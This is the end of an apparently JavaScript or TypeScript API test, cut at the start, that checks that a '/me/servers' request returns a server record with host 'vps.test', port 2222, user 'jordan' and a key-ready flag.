    }>("/me/servers", { session: owner })

    expect(response.json.data[0]).toMatchObject({
      host: "vps.test",
      port: 2222,
      user: "jordan",
      key_ready: true,
    })
  })
})
